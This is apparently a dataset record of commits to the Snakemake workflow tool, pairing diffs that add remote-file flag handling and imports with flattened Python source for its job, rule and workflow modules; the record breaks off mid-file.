logger.info(\"Removing output files of failed job {}\"\n                        \" since they might be corrupted:\\n{}\".format(\n                            self, \", \".join(to_remove)))\n            for f in to_remove:\n                f.remove()\n\n    def format_wildcards(self, string, **variables):\n        \"\"\" Format a string with variables from the job. \"\"\"\n        _variables = dict()\n        _variables.update(self.rule.workflow.globals)\n        _variables.update(dict(input=self.input,\n                               output=self.output,\n                               params=self.params,\n                               wildcards=self._format_wildcards,\n                               threads=self.threads,\n                               resources=self.resources,\n                               log=self.log,\n                               version=self.rule.version,\n                               rule=self.rule.name, ))\n        _variables.update(variables)\n        try:\n            return format(string, **_variables)\n        except NameError as ex:\n            raise RuleException(\"NameError: \" + str(ex), rule=self.rule)\n        except IndexError as ex:\n            raise RuleException(\"IndexError: \" + str(ex), rule=self.rule)\n\n    def properties(self, omit_resources=\"_cores _nodes\".split()):\n        resources = {\n            name: res\n            for name, res in self.resources.items()\n            if name not in omit_resources\n        }\n        params = {name: value for name, value in self.params.items()}\n        properties = {\n            \"rule\": self.rule.name,\n            \"local\": self.dag.workflow.is_local(self.rule),\n            \"input\": self.input,\n            \"output\": self.output,\n            \"params\": params,\n            \"threads\": self.threads,\n            \"resources\": resources\n        }\n        return properties\n\n    def json(self):\n        return json.dumps(self.properties())\n\n    def __repr__(self):\n        return self.rule.name\n\n    def __eq__(self, other):\n        if other is None:\n            return False\n        return self.rule == other.rule and (\n            self.dynamic_output or self.wildcards_dict == other.wildcards_dict)\n\n    def __lt__(self, other):\n        return self.rule.__lt__(other.rule)\n\n    def __gt__(self, other):\n        return self.rule.__gt__(other.rule)\n\n    def __hash__(self):\n        return self._hash\n\n    @staticmethod\n    def expand_dynamic(pattern, restriction=None, omit_value=None):\n        \"\"\" Expand dynamic files. \"\"\"\n        return list(listfiles(pattern,\n                              restriction=restriction,\n                              omit_value=omit_value))\n\n\nclass Reason:\n    def __init__(self):\n        self.updated_input = set()\n        self.updated_input_run = set()\n        self.missing_output = set()\n        self.incomplete_output = set()\n        self.forced = False\n        self.noio = False\n        self.nooutput = False\n        self.derived = True\n\n    def __str__(self):\n        s = list()\n        if self.forced:\n            s.append(\"Forced execution\")\n        else:\n            if self.noio:\n                s.append(\"Rules with neither input nor \"\n                         \"output files are always executed.\")\n            elif self.nooutput:\n                s.append(\"Rules with a run or shell declaration but no output \"\n                         \"are always executed.\")\n            else:\n                if self.missing_output:\n                    s.append(\"Missing output files: {}\".format(\n                        \", \".join(self.missing_output)))\n                if self.incomplete_output:\n                    s.append(\"Incomplete output files: {}\".format(\n                        \", \".join(self.incomplete_output)))\n                updated_input = self.updated_input - self.updated_input_run\n                if updated_input:\n                    s.append(\"Updated input files: {}\".format(\n                        \", \".join(updated_input)))\n                if self.updated_input_run:\n                    s.append(\"Input files updated by another job: {}\".format(\n                        \", \".join(self.updated_input_run)))\n        s = \"; \".join(s)\n        return s\n\n    def __bool__(self):\n        return bool(self.updated_input or self.missing_output or self.forced or\n                    self.updated_input_run or self.noio or self.nooutput)\n"},"\/snakemake\/remote_providers\/__init__.py":{"changes":[{"diff":"-0,","add":0,"remove":0,"filename":"\/snakemake\/remote_providers\/__init__.py","badparts":["0,"],"goodparts":[]},{"diff":"-0,","add":0,"remove":0,"filename":"\/snakemake\/remote_providers\/__init__.py","badparts":["0,"],"goodparts":[]}]},"\/snakemake\/rules.py":{"changes":[{"diff":"\n             if f in dynamic_io:\n                 try:\n                     for e in reversed(expand(f, zip, **wildcards)):\n-                        expansion[i].append(IOFile(e, rule=branch))\n+                        # need to clone the flags so intermediate\n+                        # dynamic remote file paths are expanded and \n+                        # removed appropriately\n+                        ioFile = IOFile(e, rule=branch)\n+                        ioFile.clone_flags(f)\n+                        expansion[i].append(ioFile)\n                 except KeyError:\n                     re","add":6,"remove":1,"filename":"\/snakemake\/rules.py","badparts":["                        expansion[i].append(IOFile(e, rule=branch))"],"goodparts":["                        ioFile = IOFile(e, rule=branch)","                        ioFile.clone_flags(f)","                        expansion[i].append(ioFile)"]},{"diff":"\n             if f in dynamic_io:\n                 try:\n                     for e in reversed(expand(f, zip, **wildcards)):\n-                        expansion[i].append(IOFile(e, rule=branch))\n+                        # need to clone the flags so intermediate\n+                        # dynamic remote file paths are expanded and \n+                        # removed appropriately\n+                        ioFile = IOFile(e, rule=branch)\n+                        ioFile.clone_flags(f)\n+                        expansion[i].append(ioFile)\n                 except KeyError:\n                     re","add":6,"remove":1,"filename":"\/snakemake\/rules.py","badparts":["                        expansion[i].append(IOFile(e, rule=branch))"],"goodparts":["                        ioFile = IOFile(e, rule=branch)","                        ioFile.clone_flags(f)","                        expansion[i].append(ioFile)"]}],"source":"\n__author__=\"Johannes K\u00f6ster\" __copyright__=\"Copyright 2015, Johannes K\u00f6ster\" __email__=\"koester@jimmy.harvard.edu\" __license__=\"MIT\" import os import re import sys import inspect import sre_constants from collections import defaultdict from snakemake.io import IOFile, _IOFile, protected, temp, dynamic, Namedlist from snakemake.io import expand, InputFiles, OutputFiles, Wildcards, Params, Log from snakemake.io import apply_wildcards, is_flagged, not_iterable from snakemake.exceptions import RuleException, IOFileException, WildcardError, InputFunctionException class Rule: def __init__(self, *args, lineno=None, snakefile=None): \"\"\" Create a rule Arguments name --the name of the rule \"\"\" if len(args)==2: name, workflow=args self.name=name self.workflow=workflow self.docstring=None self.message=None self._input=InputFiles() self._output=OutputFiles() self._params=Params() self.dependencies=dict() self.dynamic_output=set() self.dynamic_input=set() self.temp_output=set() self.protected_output=set() self.touch_output=set() self.subworkflow_input=dict() self.resources=dict(_cores=1, _nodes=1) self.priority=0 self.version=None self._log=Log() self._benchmark=None self.wildcard_names=set() self.lineno=lineno self.snakefile=snakefile self.run_func=None self.shellcmd=None self.norun=False elif len(args)==1: other=args[0] self.name=other.name self.workflow=other.workflow self.docstring=other.docstring self.message=other.message self._input=InputFiles(other._input) self._output=OutputFiles(other._output) self._params=Params(other._params) self.dependencies=dict(other.dependencies) self.dynamic_output=set(other.dynamic_output) self.dynamic_input=set(other.dynamic_input) self.temp_output=set(other.temp_output) self.protected_output=set(other.protected_output) self.touch_output=set(other.touch_output) self.subworkflow_input=dict(other.subworkflow_input) self.resources=other.resources self.priority=other.priority self.version=other.version self._log=other._log self._benchmark=other._benchmark self.wildcard_names=set(other.wildcard_names) self.lineno=other.lineno self.snakefile=other.snakefile self.run_func=other.run_func self.shellcmd=other.shellcmd self.norun=other.norun def dynamic_branch(self, wildcards, input=True): def get_io(rule): return(rule.input, rule.dynamic_input) if input else( rule.output, rule.dynamic_output ) io, dynamic_io=get_io(self) branch=Rule(self) io_, dynamic_io_=get_io(branch) expansion=defaultdict(list) for i, f in enumerate(io): if f in dynamic_io: try: for e in reversed(expand(f, zip, **wildcards)): expansion[i].append(IOFile(e, rule=branch)) except KeyError: return None replacements=[(i, io[i], e) for i, e in reversed(list(expansion.items()))] for i, old, exp in replacements: dynamic_io_.remove(old) io_.insert_items(i, exp) if not input: for i, old, exp in replacements: if old in branch.temp_output: branch.temp_output.discard(old) branch.temp_output.update(exp) if old in branch.protected_output: branch.protected_output.discard(old) branch.protected_output.update(exp) if old in branch.touch_output: branch.touch_output.discard(old) branch.touch_output.update(exp) branch.wildcard_names.clear() non_dynamic_wildcards=dict((name, values[0]) for name, values in wildcards.items() if len(set(values))==1) (branch._input, branch._output, branch._params, branch._log, branch._benchmark, _, branch.dependencies )=branch.expand_wildcards(wildcards=non_dynamic_wildcards) return branch, non_dynamic_wildcards return branch def has_wildcards(self): \"\"\" Return True if rule contains wildcards. \"\"\" return bool(self.wildcard_names) @property def benchmark(self): return self._benchmark @benchmark.setter def benchmark(self, benchmark): self._benchmark=IOFile(benchmark, rule=self) @property def input(self): return self._input def set_input(self, *input, **kwinput): \"\"\" Add a list of input files. Recursive lists are flattened. Arguments input --the list of input files \"\"\" for item in input: self._set_inoutput_item(item) for name, item in kwinput.items(): self._set_inoutput_item(item, name=name) @property def output(self): return self._output @property def products(self): products=list(self.output) if self.benchmark: products.append(self.benchmark) return products def set_output(self, *output, **kwoutput): \"\"\" Add a list of output files. Recursive lists are flattened. Arguments output --the list of output files \"\"\" for item in output: self._set_inoutput_item(item, output=True) for name, item in kwoutput.items(): self._set_inoutput_item(item, output=True, name=name) for item in self.output: if self.dynamic_output and item not in self.dynamic_output: raise SyntaxError( \"A rule with dynamic output may not define any \" \"non-dynamic output files.\") wildcards=item.get_wildcard_names() if self.wildcard_names: if self.wildcard_names !=wildcards: raise SyntaxError( \"Not all output files of rule{} \" \"contain the same wildcards.\".format(self.name)) else: self.wildcard_names=wildcards def _set_inoutput_item(self, item, output=False, name=None): \"\"\" Set an item to be input or output. Arguments item --the item inoutput --either a Namedlist of input or output items name --an optional name for the item \"\"\" inoutput=self.output if output else self.input if isinstance(item, str): if isinstance(item, _IOFile): self.dependencies[item]=item.rule _item=IOFile(item, rule=self) if is_flagged(item, \"temp\"): if not output: raise SyntaxError(\"Only output files may be temporary\") self.temp_output.add(_item) if is_flagged(item, \"protected\"): if not output: raise SyntaxError(\"Only output files may be protected\") self.protected_output.add(_item) if is_flagged(item, \"touch\"): if not output: raise SyntaxError( \"Only output files may be marked for touching.\") self.touch_output.add(_item) if is_flagged(item, \"dynamic\"): if output: self.dynamic_output.add(_item) else: self.dynamic_input.add(_item) if is_flagged(item, \"subworkflow\"): if output: raise SyntaxError( \"Only input files may refer to a subworkflow\") else: self.subworkflow_input[_item]=item.flags[\"subworkflow\"] inoutput.append(_item) if name: inoutput.add_name(name) elif callable(item): if output: raise SyntaxError( \"Only input files can be specified as functions\") inoutput.append(item) if name: inoutput.add_name(name) else: try: start=len(inoutput) for i in item: self._set_inoutput_item(i, output=output) if name: inoutput.set_name(name, start, end=len(inoutput)) except TypeError: raise SyntaxError( \"Input and output files have to be specified as strings or lists of strings.\") @property def params(self): return self._params def set_params(self, *params, **kwparams): for item in params: self._set_params_item(item) for name, item in kwparams.items(): self._set_params_item(item, name=name) def _set_params_item(self, item, name=None): if isinstance(item, str) or callable(item): self.params.append(item) if name: self.params.add_name(name) else: try: start=len(self.params) for i in item: self._set_params_item(i) if name: self.params.set_name(name, start, end=len(self.params)) except TypeError: raise SyntaxError(\"Params have to be specified as strings.\") @property def log(self): return self._log def set_log(self, *logs, **kwlogs): for item in logs: self._set_log_item(item) for name, item in kwlogs.items(): self._set_log_item(item, name=name) def _set_log_item(self, item, name=None): if isinstance(item, str) or callable(item): self.log.append(IOFile(item, rule=self) if isinstance(item, str) else item) if name: self.log.add_name(name) else: try: start=len(self.log) for i in item: self._set_log_item(i) if name: self.log.set_name(name, start, end=len(self.log)) except TypeError: raise SyntaxError(\"Log files have to be specified as strings.\") def expand_wildcards(self, wildcards=None): \"\"\" Expand wildcards depending on the requested output or given wildcards dict. \"\"\" def concretize_iofile(f, wildcards): if not isinstance(f, _IOFile): return IOFile(f, rule=self) else: return f.apply_wildcards(wildcards, fill_missing=f in self.dynamic_input, fail_dynamic=self.dynamic_output) def _apply_wildcards(newitems, olditems, wildcards, wildcards_obj, concretize=apply_wildcards, ruleio=None): for name, item in olditems.allitems(): start=len(newitems) is_iterable=True if callable(item): try: item=item(wildcards_obj) except(Exception, BaseException) as e: raise InputFunctionException(e, rule=self) if not_iterable(item): item=[item] is_iterable=False for item_ in item: if not isinstance(item_, str): raise RuleException( \"Input function did not return str or list of str.\", rule=self) concrete=concretize(item_, wildcards) newitems.append(concrete) if ruleio is not None: ruleio[concrete]=item_ else: if not_iterable(item): item=[item] is_iterable=False for item_ in item: concrete=concretize(item_, wildcards) newitems.append(concrete) if ruleio is not None: ruleio[concrete]=item_ if name: newitems.set_name( name, start, end=len(newitems) if is_iterable else None) if wildcards is None: wildcards=dict() missing_wildcards=self.wildcard_names -set(wildcards.keys()) if missing_wildcards: raise RuleException( \"Could not resolve wildcards in rule{}:\\n{}\".format( self.name, \"\\n\".join(self.wildcard_names)), lineno=self.lineno, snakefile=self.snakefile) ruleio=dict() try: input=InputFiles() wildcards_obj=Wildcards(fromdict=wildcards) _apply_wildcards(input, self.input, wildcards, wildcards_obj, concretize=concretize_iofile, ruleio=ruleio) params=Params() _apply_wildcards(params, self.params, wildcards, wildcards_obj) output=OutputFiles(o.apply_wildcards(wildcards) for o in self.output) output.take_names(self.output.get_names()) dependencies={ None if f is None else f.apply_wildcards(wildcards): rule for f, rule in self.dependencies.items() } ruleio.update(dict((f, f_) for f, f_ in zip(output, self.output))) log=Log() _apply_wildcards(log, self.log, wildcards, wildcards_obj, concretize=concretize_iofile) benchmark=self.benchmark.apply_wildcards( wildcards) if self.benchmark else None return input, output, params, log, benchmark, ruleio, dependencies except WildcardError as ex: raise RuleException( \"Wildcards in input, params, log or benchmark file of rule{} cannot be \" \"determined from output files:\\n{}\".format(self, str(ex)), lineno=self.lineno, snakefile=self.snakefile) def is_producer(self, requested_output): \"\"\" Returns True if this rule is a producer of the requested output. \"\"\" try: for o in self.products: if o.match(requested_output): return True return False except sre_constants.error as ex: raise IOFileException(\"{} in wildcard statement\".format(ex), snakefile=self.snakefile, lineno=self.lineno) except ValueError as ex: raise IOFileException(\"{}\".format(ex), snakefile=self.snakefile, lineno=self.lineno) def get_wildcards(self, requested_output): \"\"\" Update the given wildcard dictionary by matching regular expression output files to the requested concrete ones. Arguments wildcards --a dictionary of wildcards requested_output --a concrete filepath \"\"\" if requested_output is None: return dict() bestmatchlen=0 bestmatch=None for o in self.products: match=o.match(requested_output) if match: l=self.get_wildcard_len(match.groupdict()) if not bestmatch or bestmatchlen > l: bestmatch=match.groupdict() bestmatchlen=l return bestmatch @staticmethod def get_wildcard_len(wildcards): \"\"\" Return the length of the given wildcard values. Arguments wildcards --a dict of wildcards \"\"\" return sum(map(len, wildcards.values())) def __lt__(self, rule): comp=self.workflow._ruleorder.compare(self, rule) return comp < 0 def __gt__(self, rule): comp=self.workflow._ruleorder.compare(self, rule) return comp > 0 def __str__(self): return self.name def __hash__(self): return self.name.__hash__() def __eq__(self, other): return self.name==other.name class Ruleorder: def __init__(self): self.order=list() def add(self, *rulenames): \"\"\" Records the order of given rules as rule1 > rule2 > rule3,... \"\"\" self.order.append(list(rulenames)) def compare(self, rule1, rule2): \"\"\" Return whether rule2 has a higher priority than rule1. \"\"\" for clause in reversed(self.order): try: i=clause.index(rule1.name) j=clause.index(rule2.name) comp=j -i if comp < 0: comp=-1 elif comp > 0: comp=1 return comp except ValueError: pass wildcard_cmp=rule2.has_wildcards() -rule1.has_wildcards() if wildcard_cmp !=0: return wildcard_cmp return 0 def __iter__(self): return self.order.__iter__() ","sourceWithComments":"__author__ = \"Johannes K\u00f6ster\"\n__copyright__ = \"Copyright 2015, Johannes K\u00f6ster\"\n__email__ = \"koester@jimmy.harvard.edu\"\n__license__ = \"MIT\"\n\nimport os\nimport re\nimport sys\nimport inspect\nimport sre_constants\nfrom collections import defaultdict\n\nfrom snakemake.io import IOFile, _IOFile, protected, temp, dynamic, Namedlist\nfrom snakemake.io import expand, InputFiles, OutputFiles, Wildcards, Params, Log\nfrom snakemake.io import apply_wildcards, is_flagged, not_iterable\nfrom snakemake.exceptions import RuleException, IOFileException, WildcardError, InputFunctionException\n\n\nclass Rule:\n    def __init__(self, *args, lineno=None, snakefile=None):\n        \"\"\"\n        Create a rule\n\n        Arguments\n        name -- the name of the rule\n        \"\"\"\n        if len(args) == 2:\n            name, workflow = args\n            self.name = name\n            self.workflow = workflow\n            self.docstring = None\n            self.message = None\n            self._input = InputFiles()\n            self._output = OutputFiles()\n            self._params = Params()\n            self.dependencies = dict()\n            self.dynamic_output = set()\n            self.dynamic_input = set()\n            self.temp_output = set()\n            self.protected_output = set()\n            self.touch_output = set()\n            self.subworkflow_input = dict()\n            self.resources = dict(_cores=1, _nodes=1)\n            self.priority = 0\n            self.version = None\n            self._log = Log()\n            self._benchmark = None\n            self.wildcard_names = set()\n            self.lineno = lineno\n            self.snakefile = snakefile\n            self.run_func = None\n            self.shellcmd = None\n            self.norun = False\n        elif len(args) == 1:\n            other = args[0]\n            self.name = other.name\n            self.workflow = other.workflow\n            self.docstring = other.docstring\n            self.message = other.message\n            self._input = InputFiles(other._input)\n            self._output = OutputFiles(other._output)\n            self._params = Params(other._params)\n            self.dependencies = dict(other.dependencies)\n            self.dynamic_output = set(other.dynamic_output)\n            self.dynamic_input = set(other.dynamic_input)\n            self.temp_output = set(other.temp_output)\n            self.protected_output = set(other.protected_output)\n            self.touch_output = set(other.touch_output)\n            self.subworkflow_input = dict(other.subworkflow_input)\n            self.resources = other.resources\n            self.priority = other.priority\n            self.version = other.version\n            self._log = other._log\n            self._benchmark = other._benchmark\n            self.wildcard_names = set(other.wildcard_names)\n            self.lineno = other.lineno\n            self.snakefile = other.snakefile\n            self.run_func = other.run_func\n            self.shellcmd = other.shellcmd\n            self.norun = other.norun\n\n    def dynamic_branch(self, wildcards, input=True):\n        def get_io(rule):\n            return (rule.input, rule.dynamic_input) if input else (\n                rule.output, rule.dynamic_output\n            )\n\n        io, dynamic_io = get_io(self)\n\n        branch = Rule(self)\n        io_, dynamic_io_ = get_io(branch)\n\n        expansion = defaultdict(list)\n        for i, f in enumerate(io):\n            if f in dynamic_io:\n                try:\n                    for e in reversed(expand(f, zip, **wildcards)):\n                        expansion[i].append(IOFile(e, rule=branch))\n                except KeyError:\n                    return None\n\n        # replace the dynamic files with the expanded files\n        replacements = [(i, io[i], e)\n                        for i, e in reversed(list(expansion.items()))]\n        for i, old, exp in replacements:\n            dynamic_io_.remove(old)\n            io_.insert_items(i, exp)\n\n        if not input:\n            for i, old, exp in replacements:\n                if old in branch.temp_output:\n                    branch.temp_output.discard(old)\n                    branch.temp_output.update(exp)\n                if old in branch.protected_output:\n                    branch.protected_output.discard(old)\n                    branch.protected_output.update(exp)\n                if old in branch.touch_output:\n                    branch.touch_output.discard(old)\n                    branch.touch_output.update(exp)\n\n            branch.wildcard_names.clear()\n            non_dynamic_wildcards = dict((name, values[0])\n                                         for name, values in wildcards.items()\n                                         if len(set(values)) == 1)\n            # TODO have a look into how to concretize dependencies here\n            (branch._input, branch._output, branch._params, branch._log,\n             branch._benchmark, _, branch.dependencies\n             ) = branch.expand_wildcards(wildcards=non_dynamic_wildcards)\n            return branch, non_dynamic_wildcards\n        return branch\n\n    def has_wildcards(self):\n        \"\"\"\n        Return True if rule contains wildcards.\n        \"\"\"\n        return bool(self.wildcard_names)\n\n    @property\n    def benchmark(self):\n        return self._benchmark\n\n    @benchmark.setter\n    def benchmark(self, benchmark):\n        self._benchmark = IOFile(benchmark, rule=self)\n\n    @property\n    def input(self):\n        return self._input\n\n    def set_input(self, *input, **kwinput):\n        \"\"\"\n        Add a list of input files. Recursive lists are flattened.\n\n        Arguments\n        input -- the list of input files\n        \"\"\"\n        for item in input:\n            self._set_inoutput_item(item)\n        for name, item in kwinput.items():\n            self._set_inoutput_item(item, name=name)\n\n    @property\n    def output(self):\n        return self._output\n\n    @property\n    def products(self):\n        products = list(self.output)\n        if self.benchmark:\n            products.append(self.benchmark)\n        return products\n\n    def set_output(self, *output, **kwoutput):\n        \"\"\"\n        Add a list of output files. Recursive lists are flattened.\n\n        Arguments\n        output -- the list of output files\n        \"\"\"\n        for item in output:\n            self._set_inoutput_item(item, output=True)\n        for name, item in kwoutput.items():\n            self._set_inoutput_item(item, output=True, name=name)\n\n        for item in self.output:\n            if self.dynamic_output and item not in self.dynamic_output:\n                raise SyntaxError(\n                    \"A rule with dynamic output may not define any \"\n                    \"non-dynamic output files.\")\n            wildcards = item.get_wildcard_names()\n            if self.wildcard_names:\n                if self.wildcard_names != wildcards:\n                    raise SyntaxError(\n                        \"Not all output files of rule {} \"\n                        \"contain the same wildcards.\".format(self.name))\n            else:\n                self.wildcard_names = wildcards\n\n    def _set_inoutput_item(self, item, output=False, name=None):\n        \"\"\"\n        Set an item to be input or output.\n\n        Arguments\n        item     -- the item\n        inoutput -- either a Namedlist of input or output items\n        name     -- an optional name for the item\n        \"\"\"\n        inoutput = self.output if output else self.input\n        if isinstance(item, str):\n            # add the rule to the dependencies\n            if isinstance(item, _IOFile):\n                self.dependencies[item] = item.rule\n            _item = IOFile(item, rule=self)\n            if is_flagged(item, \"temp\"):\n                if not output:\n                    raise SyntaxError(\"Only output files may be temporary\")\n                self.temp_output.add(_item)\n            if is_flagged(item, \"protected\"):\n                if not output:\n                    raise SyntaxError(\"Only output files may be protected\")\n                self.protected_output.add(_item)\n            if is_flagged(item, \"touch\"):\n                if not output:\n                    raise SyntaxError(\n                        \"Only output files may be marked for touching.\")\n                self.touch_output.add(_item)\n            if is_flagged(item, \"dynamic\"):\n                if output:\n                    self.dynamic_output.add(_item)\n                else:\n                    self.dynamic_input.add(_item)\n            if is_flagged(item, \"subworkflow\"):\n                if output:\n                    raise SyntaxError(\n                        \"Only input files may refer to a subworkflow\")\n                else:\n                    # record the workflow this item comes from\n                    self.subworkflow_input[_item] = item.flags[\"subworkflow\"]\n            inoutput.append(_item)\n            if name:\n                inoutput.add_name(name)\n        elif callable(item):\n            if output:\n                raise SyntaxError(\n                    \"Only input files can be specified as functions\")\n            inoutput.append(item)\n            if name:\n                inoutput.add_name(name)\n        else:\n            try:\n                start = len(inoutput)\n                for i in item:\n                    self._set_inoutput_item(i, output=output)\n                if name:\n                    # if the list was named, make it accessible\n                    inoutput.set_name(name, start, end=len(inoutput))\n            except TypeError:\n                raise SyntaxError(\n                    \"Input and output files have to be specified as strings or lists of strings.\")\n\n    @property\n    def params(self):\n        return self._params\n\n    def set_params(self, *params, **kwparams):\n        for item in params:\n            self._set_params_item(item)\n        for name, item in kwparams.items():\n            self._set_params_item(item, name=name)\n\n    def _set_params_item(self, item, name=None):\n        if isinstance(item, str) or callable(item):\n            self.params.append(item)\n            if name:\n                self.params.add_name(name)\n        else:\n            try:\n                start = len(self.params)\n                for i in item:\n                    self._set_params_item(i)\n                if name:\n                    self.params.set_name(name, start, end=len(self.params))\n            except TypeError:\n                raise SyntaxError(\"Params have to be specified as strings.\")\n\n    @property\n    def log(self):\n        return self._log\n\n    def set_log(self, *logs, **kwlogs):\n        for item in logs:\n            self._set_log_item(item)\n        for name, item in kwlogs.items():\n            self._set_log_item(item, name=name)\n\n    def _set_log_item(self, item, name=None):\n        if isinstance(item, str) or callable(item):\n            self.log.append(IOFile(item,\n                                   rule=self)\n                            if isinstance(item, str) else item)\n            if name:\n                self.log.add_name(name)\n        else:\n            try:\n                start = len(self.log)\n                for i in item:\n                    self._set_log_item(i)\n                if name:\n                    self.log.set_name(name, start, end=len(self.log))\n            except TypeError:\n                raise SyntaxError(\"Log files have to be specified as strings.\")\n\n    def expand_wildcards(self, wildcards=None):\n        \"\"\"\n        Expand wildcards depending on the requested output\n        or given wildcards dict.\n        \"\"\"\n\n        def concretize_iofile(f, wildcards):\n            if not isinstance(f, _IOFile):\n                return IOFile(f, rule=self)\n            else:\n                return f.apply_wildcards(wildcards,\n                                         fill_missing=f in self.dynamic_input,\n                                         fail_dynamic=self.dynamic_output)\n\n        def _apply_wildcards(newitems, olditems, wildcards, wildcards_obj,\n                             concretize=apply_wildcards,\n                             ruleio=None):\n            for name, item in olditems.allitems():\n                start = len(newitems)\n                is_iterable = True\n                if callable(item):\n                    try:\n                        item = item(wildcards_obj)\n                    except (Exception, BaseException) as e:\n                        raise InputFunctionException(e, rule=self)\n                    if not_iterable(item):\n                        item = [item]\n                        is_iterable = False\n                    for item_ in item:\n                        if not isinstance(item_, str):\n                            raise RuleException(\n                                \"Input function did not return str or list of str.\",\n                                rule=self)\n                        concrete = concretize(item_, wildcards)\n                        newitems.append(concrete)\n                        if ruleio is not None:\n                            ruleio[concrete] = item_\n                else:\n                    if not_iterable(item):\n                        item = [item]\n                        is_iterable = False\n                    for item_ in item:\n                        concrete = concretize(item_, wildcards)\n                        newitems.append(concrete)\n                        if ruleio is not None:\n                            ruleio[concrete] = item_\n                if name:\n                    newitems.set_name(\n                        name, start,\n                        end=len(newitems) if is_iterable else None)\n\n        if wildcards is None:\n            wildcards = dict()\n        missing_wildcards = self.wildcard_names - set(wildcards.keys())\n\n        if missing_wildcards:\n            raise RuleException(\n                \"Could not resolve wildcards in rule {}:\\n{}\".format(\n                    self.name, \"\\n\".join(self.wildcard_names)),\n                lineno=self.lineno,\n                snakefile=self.snakefile)\n\n        ruleio = dict()\n\n        try:\n            input = InputFiles()\n            wildcards_obj = Wildcards(fromdict=wildcards)\n            _apply_wildcards(input, self.input, wildcards, wildcards_obj,\n                             concretize=concretize_iofile,\n                             ruleio=ruleio)\n\n            params = Params()\n            _apply_wildcards(params, self.params, wildcards, wildcards_obj)\n\n            output = OutputFiles(o.apply_wildcards(wildcards)\n                                 for o in self.output)\n            output.take_names(self.output.get_names())\n\n            dependencies = {\n                None if f is None else f.apply_wildcards(wildcards): rule\n                for f, rule in self.dependencies.items()\n            }\n\n            ruleio.update(dict((f, f_) for f, f_ in zip(output, self.output)))\n\n            log = Log()\n            _apply_wildcards(log, self.log, wildcards, wildcards_obj,\n                             concretize=concretize_iofile)\n\n            benchmark = self.benchmark.apply_wildcards(\n                wildcards) if self.benchmark else None\n            return input, output, params, log, benchmark, ruleio, dependencies\n        except WildcardError as ex:\n            # this can only happen if an input contains an unresolved wildcard.\n            raise RuleException(\n                \"Wildcards in input, params, log or benchmark file of rule {} cannot be \"\n                \"determined from output files:\\n{}\".format(self, str(ex)),\n                lineno=self.lineno,\n                snakefile=self.snakefile)\n\n    def is_producer(self, requested_output):\n        \"\"\"\n        Returns True if this rule is a producer of the requested output.\n        \"\"\"\n        try:\n            for o in self.products:\n                if o.match(requested_output):\n                    return True\n            return False\n        except sre_constants.error as ex:\n            raise IOFileException(\"{} in wildcard statement\".format(ex),\n                                  snakefile=self.snakefile,\n                                  lineno=self.lineno)\n        except ValueError as ex:\n            raise IOFileException(\"{}\".format(ex),\n                                  snakefile=self.snakefile,\n                                  lineno=self.lineno)\n\n    def get_wildcards(self, requested_output):\n        \"\"\"\n        Update the given wildcard dictionary by matching regular expression\n        output files to the requested concrete ones.\n\n        Arguments\n        wildcards -- a dictionary of wildcards\n        requested_output -- a concrete filepath\n        \"\"\"\n        if requested_output is None:\n            return dict()\n        bestmatchlen = 0\n        bestmatch = None\n\n        for o in self.products:\n            match = o.match(requested_output)\n            if match:\n                l = self.get_wildcard_len(match.groupdict())\n                if not bestmatch or bestmatchlen > l:\n                    bestmatch = match.groupdict()\n                    bestmatchlen = l\n        return bestmatch\n\n    @staticmethod\n    def get_wildcard_len(wildcards):\n        \"\"\"\n        Return the length of the given wildcard values.\n\n        Arguments\n        wildcards -- a dict of wildcards\n        \"\"\"\n        return sum(map(len, wildcards.values()))\n\n    def __lt__(self, rule):\n        comp = self.workflow._ruleorder.compare(self, rule)\n        return comp < 0\n\n    def __gt__(self, rule):\n        comp = self.workflow._ruleorder.compare(self, rule)\n        return comp > 0\n\n    def __str__(self):\n        return self.name\n\n    def __hash__(self):\n        return self.name.__hash__()\n\n    def __eq__(self, other):\n        return self.name == other.name\n\n\nclass Ruleorder:\n    def __init__(self):\n        self.order = list()\n\n    def add(self, *rulenames):\n        \"\"\"\n        Records the order of given rules as rule1 > rule2 > rule3, ...\n        \"\"\"\n        self.order.append(list(rulenames))\n\n    def compare(self, rule1, rule2):\n        \"\"\"\n        Return whether rule2 has a higher priority than rule1.\n        \"\"\"\n        # try the last clause first,\n        # i.e. clauses added later overwrite those before.\n        for clause in reversed(self.order):\n            try:\n                i = clause.index(rule1.name)\n                j = clause.index(rule2.name)\n                # rules with higher priority should have a smaller index\n                comp = j - i\n                if comp < 0:\n                    comp = -1\n                elif comp > 0:\n                    comp = 1\n                return comp\n            except ValueError:\n                pass\n\n        # if not ruleorder given, prefer rule without wildcards\n        wildcard_cmp = rule2.has_wildcards() - rule1.has_wildcards()\n        if wildcard_cmp != 0:\n            return wildcard_cmp\n\n        return 0\n\n    def __iter__(self):\n        return self.order.__iter__()\n"},"\/snakemake\/workflow.py":{"changes":[{"diff":"\n from snakemake.scheduler import JobScheduler\n from snakemake.parser import parse\n import snakemake.io\n-from snakemake.io import protected, temp, temporary, expand, dynamic, glob_wildcards, flag, not_iterable, touch\n+from snakemake.io import protected, temp, temporary, expand, dynamic, remote, glob_wildcards, glob_wildcards_remote, flag, not_iterable, touch\n from snakemake.persistence import Persistence\n from snakemake.utils import upd","add":1,"remove":1,"filename":"\/snakemake\/workflow.py","badparts":["from snakemake.io import protected, temp, temporary, expand, dynamic, glob_wildcards, flag, not_iterable, touch"],"goodparts":["from snakemake.io import protected, temp, temporary, expand, dynamic, remote, glob_wildcards, glob_wildcards_remote, flag, not_iterable, touch"]},{"diff":"\n from snakemake.scheduler import JobScheduler\n from snakemake.parser import parse\n import snakemake.io\n-from snakemake.io import protected, temp, temporary, expand, dynamic, glob_wildcards, flag, not_iterable, touch\n+from snakemake.io import protected, temp, temporary, expand, dynamic, remote, glob_wildcards, glob_wildcards_remote, flag, not_iterable, touch\n from snakemake.persistence import Persistence\n from snakemake.utils import upd","add":1,"remove":1,"filename":"\/snakemake\/workflow.py","badparts":["from snakemake.io import protected, temp, temporary, expand, dynamic, glob_wildcards, flag, not_iterable, touch"],"goodparts":["from snakemake.io import protected, temp, temporary, expand, dynamic, remote, glob_wildcards, glob_wildcards_remote, flag, not_iterable, touch"]}],"source":"\n__author__=\"Johannes K\u00f6ster\" __copyright__=\"Copyright 2015, Johannes K\u00f6ster\" __email__=\"koester@jimmy.harvard.edu\" __license__=\"MIT\" import re import os import sys import signal import json import urllib from collections import OrderedDict from itertools import filterfalse, chain from functools import partial from operator import attrgetter from snakemake.logging import logger, format_resources, format_resource_names from snakemake.rules import Rule, Ruleorder from snakemake.exceptions import RuleException, CreateRuleException, \\ UnknownRuleException, NoRulesException, print_exception, 